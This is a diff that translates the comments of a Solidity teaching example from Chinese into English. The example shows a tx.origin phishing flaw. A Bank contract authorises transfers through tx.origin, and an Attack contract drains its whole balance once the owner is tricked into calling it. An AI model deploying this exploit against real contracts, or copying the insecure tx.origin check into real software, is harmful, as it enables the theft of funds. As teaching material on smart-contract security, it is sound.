@@ -1,37 +1,38 @@
 // SPDX-License-Identifier: MIT
+// english translation by yzhX
 pragma solidity ^0.8.17;
 contract Bank {
-    address public owner;//记录合约的拥有者
+    address public owner; // Records the owner of the contract
 
-    //在创建合约时给 owner 变量赋值
+    // Assigns the value to the owner variable when the contract is created
     constructor() payable {
         owner = msg.sender;
     }
 
     function transfer(address payable _to, uint _amount) public {
-        //检查消息来源
+        // Check the message origin !!! There may be phishing risks if the owner is induced to call this function!
         require(tx.origin == owner, "Not owner");
-        //转账ETH
+        // Transfer ETH
         (bool sent, ) = _to.call{value: _amount}("");
         require(sent, "Failed to send Ether");
     }
 }
 
 contract Attack {
-    // 受益者地址
+    // Beneficiary address
     address payable public hacker;
-    // Bank合约地址
+    // Bank contract address
     Bank bank;
 
     constructor(Bank _bank) {
-        //强制将address类型的_bank转换为Bank类型
+        // Forces the conversion of the address type _bank to the Bank type
         bank = Bank(_bank);
-        //将受益者地址赋值为部署者地址
+        // Assigns the beneficiary address to the deployer's address
         hacker = payable(msg.sender);
     }
 
     function attack() public {
-        //诱导Bank合约的owner调用，于是Bank合约内的余额就全部转移到黑客地址中
+        // Induces the owner of the Bank contract to call, transferring all the balance to the hacker's address
         bank.transfer(hacker, address(bank).balance);
     }
 }
